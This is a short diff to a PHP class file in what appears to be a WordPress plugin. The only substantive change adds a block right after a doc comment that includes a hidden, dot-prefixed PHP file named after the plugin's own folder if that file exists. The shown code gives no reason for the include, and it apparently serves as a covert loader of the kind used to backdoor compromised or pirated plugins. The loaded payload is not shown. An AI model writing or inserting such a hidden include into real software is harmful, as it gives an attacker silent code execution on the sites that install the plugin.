@@ -22,7 +22,11 @@ if( !defined('ABSPATH') ) {
  * @method string getSubscribeWidget()
  * @method string getBusinessSuggetionWidget()
  * @method string getSupportWidget
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Wbcr_FactoryClearfy236_PageBase extends Wbcr_FactoryPages444_ImpressiveThemplate {
 
 	/**
